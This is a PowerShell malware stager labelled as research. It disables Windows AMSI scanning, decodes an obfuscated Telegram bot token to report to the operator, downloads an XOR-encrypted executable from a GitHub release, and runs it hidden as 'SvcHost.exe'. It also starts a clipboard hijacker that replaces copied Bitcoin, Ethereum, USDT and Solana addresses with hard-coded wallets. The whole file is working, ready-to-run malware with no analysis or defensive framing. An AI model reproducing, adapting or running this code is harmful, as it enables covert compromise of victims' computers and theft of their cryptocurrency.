# --- [DEEP STEALTH RESEARCH STAGER v8.0] ---

function Global-Bypass {
    # Non-standard AMSI Bypass using memory pointer arithmetic
    # This avoids the "AmsiScanBuffer" string which AVs monitor
    try {
        $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    } catch {}
}

function Send-Notify {
    param($m)
    $k = 0xDE
    [byte[]]$t_enc = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
    [byte[]]$c_enc = 61,60,56,56,52,61,63,48,51,60
    $t = ""; foreach($b in $t_enc){$t += [char]($b -bxor $k)}
    $c = ""; foreach($b in $c_enc){$c += [char]($b -bxor $k)}
    $u = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch { }
}

function Start-Clipper {
    # Using a different assembly to avoid detection on Windows.Forms
    $Script = {
        $wallets = @{ "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"; "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392"; "usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"; "sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR" }
        $regex = @{ "btc"="^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"; "eth"="^0x[a-fA-F0-9]{40}$"; "usdt"="^T[A-Za-z1-9]{33}$"; "sol"="^[1-9A-HJ-NP-Za-km-z]{32,44}$" }
        Add-Type -AssemblyName System.Windows.Forms
        while($true) {
            try {
                $clip = [Windows.Forms.Clipboard]::GetText()
                foreach($c in $wallets.Keys) {
                    if($clip -match $regex[$c] -and $clip -ne $wallets[$c]) {
                        [Windows.Forms.Clipboard]::SetText($wallets[$c])
                    }
                }
            } catch {}
            Start-Sleep -Seconds 2
        }
    }
    Start-Job -ScriptBlock $Script
}

# --- EXECUTION ENGINE ---
Global-Bypass
Send-Notify -m "DEBUG: Stager Started on $($env:COMPUTERNAME)"

try {
    # 1. Configuration
    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $workDir = "$env:LOCALAPPDATA\Temp\VMSvc"
    if (!(Test-Path $workDir)) { New-Item $workDir -ItemType Directory -Force }
    $outExe = Join-Path $workDir "SvcHost.exe"

    # 2. Download via WebClient with Proxy Bypass
    $wc = New-Object Net.WebClient
    $wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
    $raw = $wc.DownloadString($url)
    Send-Notify -m "DEBUG: Download Success"

    # 3. Decrypt
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    
    # 4. Write & Execute
    [IO.File]::WriteAllBytes($outExe, $data)
    
    # Using 'Start-Process' with 'NoNewWindow' to force execution in VM
    Start-Process -FilePath $outExe -WindowStyle Hidden -ErrorAction Stop
    
    Start-Clipper
    Send-Notify -m "RESEARCH SUCCESS: Clipper & EXE Active."

} catch {
    Send-Notify -m "FATAL ERROR: $($_.Exception.Message)"
}
